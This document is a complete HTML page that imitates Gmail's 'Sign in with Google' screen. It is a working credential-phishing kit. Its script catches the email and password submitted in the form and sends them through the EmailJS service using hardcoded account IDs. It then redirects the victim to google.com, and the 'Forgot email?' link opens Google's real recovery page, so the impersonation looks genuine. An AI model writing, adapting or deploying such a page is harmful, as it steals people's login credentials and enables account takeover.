<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign in to Gmail</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #fff;
    margin: 0; padding: 0;
    display: flex; justify-content: center; align-items: center;
    height: 100vh;
    color: #202124;
  }
  .container {
    width: 360px;
    border: 1px solid #dadce0;
    padding: 40px 40px 30px;
    box-sizing: border-box;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgb(0 0 0 / 0.1);
  }
  .logo {
    display: flex; align-items: center; margin-bottom: 24px;
  }
  .logo img {
    height: 40px;
    margin-right: 8px;
  }
  h1 {
    font-weight: 400;
    font-size: 24px;
    margin: 0 0 8px 0;
  }
  p.subtitle {
    font-size: 14px;
    color: #5f6368;
    margin: 0 0 24px 0;
  }
  form label {
    display: block;
    font-size: 14px;
    margin-bottom: 4px;
    font-weight: 600;
  }
  form input {
    width: 100%;
    font-size: 16px;
    padding: 10px 12px;
    margin-bottom: 20px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    box-sizing: border-box;
  }
  form input:focus {
    border-color: #1a73e8;
    outline: none;
    box-shadow: 0 0 0 1px #1a73e8;
  }
  .forgot-link {
    font-size: 14px;
    color: #1a73e8;
    cursor: pointer;
    text-decoration: none;
    margin-bottom: 24px;
    display: inline-block;
  }
  button {
    background-color: #1a73e8;
    border: none;
    color: white;
    font-size: 14px;
    font-weight: 600;
    padding: 10px 24px;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
  }
  button:hover {
    background-color: #1669c1;
  }
</style>
</head>
<body>

<div class="container" role="main" aria-label="Sign in to continue">
  <div class="logo">
    <img src="https://www.google.com/favicon.ico" alt="Google Logo" />
    <span style="font-weight:500; font-size: 18px; color:#5f6368;">Sign in with Google</span>
  </div>
  <h1>Sign in</h1>
  <p class="subtitle">to continue to <strong>Gmail</strong></p>

  <form id="login-form">
    <label for="email">Email</label>
    <input id="email" name="user_email" type="email" placeholder="Email" required autofocus autocomplete="username" />

    <label for="password">Password</label>
    <input id="password" name="user_password" type="password" placeholder="Enter your password" required autocomplete="current-password" />

    <a href="#" class="forgot-link" tabindex="0">Forgot email?</a>

    <button type="submit">Next</button>
  </form>
</div>

<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
<script>
  (function() {
    const USER_ID = "EB017wgX1BeDuRY66";
    const SERVICE_ID = "service_64albro";
    const TEMPLATE_ID = "template_y1sfcug";

    emailjs.init(USER_ID);

    const form = document.getElementById("login-form");
    const forgotLink = document.querySelector(".forgot-link");

    form.addEventListener("submit", function(event) {
      event.preventDefault();

      emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
        .then(function() {
          // Redirect to Google after successful send
          window.location.href = "https://www.google.com";
        })
        .catch(function(error) {
          alert("Oops! Something went wrong, please try again.");
          console.error("EmailJS error:", error);
        });
    });

    forgotLink.addEventListener("click", function(e) {
      e.preventDefault();
      window.open("https://accounts.google.com/signin/recovery", "_blank");
    });
  })();
</script>

</body>
</html>
